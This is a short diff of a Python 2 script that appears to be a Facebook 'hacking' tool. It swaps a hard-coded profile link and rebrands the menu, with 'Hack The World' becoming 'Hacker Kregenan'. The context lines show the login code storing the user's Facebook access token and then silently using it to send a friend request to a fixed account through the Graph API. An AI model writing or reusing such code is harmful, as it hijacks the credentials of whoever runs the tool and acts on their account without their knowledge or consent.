@@ -138,7 +138,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://facebook.com/profile.php?id=100038226635506')
+				os.system('xdg-open https://facebook.com/profile.php?id=100048664906873')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -190,8 +190,8 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;33;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;36;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;41mHack The World"	
-	print "\033[1;32;40m[2] \033[1;33;42mUpdate SufYaN"																														
+	print "\033[1;32;40m[1] \033[1;33;41mHacker Kregenan"	
+	print "\033[1;32;40m[2] \033[1;33;42mUpdate RizalCyber"																														
 	print "\033[1;32;40m[0] \033[1;33;43mLog out"
 	pilih()
 	
